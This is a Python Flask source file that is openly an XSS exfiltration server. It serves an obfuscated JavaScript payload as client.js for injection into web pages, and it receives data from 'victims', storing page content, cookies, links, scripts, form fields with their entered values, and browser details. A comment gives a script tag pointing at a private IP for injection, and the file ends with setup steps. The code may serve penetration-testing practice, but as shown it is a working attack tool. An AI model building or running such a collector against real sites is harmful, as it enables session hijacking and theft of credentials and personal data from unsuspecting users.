from flask import Flask, request, send_file
from db import get_or_insert_extraction, build_content_to_link_relationships
from db import create_connection, create_db, insert_content, insert_cookie, insert_link, insert_script, insert_form, insert_input, insert_browser
from flask_cors import CORS
from jsmin import jsmin

import logging
import os
import json

# Disable Flask access logs printed to the console. 
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
CORS(app)
database = r"sqlite.db"

# TODO: Replace with a better Python native thing. This is to uglify the payload.
os.system("uglifyjs --ie8 --toplevel -m -c -o payload.ugly.js payload.js")

trace = False

# Minify the payload using jsmin.
with open('./payload.js') as js_file:
    minified = jsmin(js_file.read())
    with open("payload.min.js", 'w') as outputfile:
        outputfile.write(minified)

# Serve payload, so that it can be included as a script reference.
@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./payload.js', attachment_filename='client.js')

# Accept data sent by victims. 
@app.route('/data', methods=['POST'])
def content():
    conn = create_connection(database)
    jsonData = request.get_json()

    domain = jsonData['domain']
    dataType = jsonData['type']
    timestamp = jsonData['timestamp']
    data = jsonData['data']

    # Extract IP address of the client.
    if request.environ.get('HTTP_X_FORWARDED_FOR') is not None:
        ip = request.environ['HTTP_X_FORWARDED_FOR']
    elif request.environ.get('HTTP_X_REAL_IP') is not None:
        ip = request.environ['HTTP_X_REAL_IP']
    elif request.environ.get('REMOTE_ADDR') is not None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.remote_addr
    
    # Create or retrive the ID for the current extraction (current execution of the payload in a given victom's browser). 
    extraction_id = get_or_insert_extraction(conn, domain, timestamp, ip)

    if dataType == 'CONTENT':
        if trace:
            print(jsonData)
        db_data = (extraction_id, data['url'], data['content'],)
        insert_content(conn, db_data)
        conn.commit()
        print("[+] Received content for domain: %s url: %s" % (domain, data['url']))
        
    elif dataType == 'COOKIE':
        if trace:
            print(jsonData)
        db_data = (extraction_id, data['content'],)
        insert_cookie(conn, db_data)
        conn.commit()
        print("[+] Received cookies for domain: %s" % domain)
    
    elif dataType == 'LINK':
        if trace:
            print(jsonData)
        for link in data['links']:
            db_data = (extraction_id, data['url'], link['link'], link['text'], link['content'],)
            insert_link(conn, db_data)
            conn.commit()
            print("[+] Received link for domain: %s url: %s data: %s" % (domain, data['url'], link['link']))
    
    elif dataType == 'SCRIPT':
        if trace:
            print(jsonData)
        db_data = (extraction_id, data['url'], data['src'], data['content'],)
        insert_script(conn, db_data)
        conn.commit()
        print("[+] Received script for domain: %s url: %s src: %s" % (domain, data['url'], data['src']))
    
    elif dataType == 'FORM':
        if trace:
            print(jsonData)
        db_data = (extraction_id, data['url'], data['action'], data['method'], data['content'])
        form_id = insert_form(conn, db_data)
        conn.commit()
        for inputField in data['inputs']:
            db_data = (extraction_id, form_id, inputField['name'], inputField['type'], inputField['value'], inputField['placeholder'], inputField['content'])
            insert_input(conn, db_data)
            conn.commit()
        print("[+] Received form for domain: %s url: %s action: %s" % (domain, data['url'], data['action']))
    
    elif dataType == 'BROWSER':
        if trace:
            print(jsonData)
        db_data = (extraction_id, data['name'], data['full_version'], data['major_version'], data['navigator_appname'], data['navigator_appversion'], data['navigator_useragent'], json.dumps(data['plugin_list']), data['os'])
        insert_browser(conn, db_data)
        conn.commit()
        print("[+] Received browser details for domain: %s" % (domain))

    build_content_to_link_relationships(conn, extraction_id)

    return ""

# For HTTP
app.run(host='0.0.0.0', port=9444)

# For HTTPS
# app.run(host='0.0.0.0', port=9445, ssl_context=('cert.pem', 'key.pem'))


# Installation steps
# ------------------------------
# sudo pip3 install flask_cors
# sudo apt-get install node-uglify
# 
# For HTTPS: 
#   openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
# 
# <script src="https://192.168.119.140:9443/client.js" />
# 
# sudo apt install npm
# sudo npm install --save-dev javascript-obfuscator
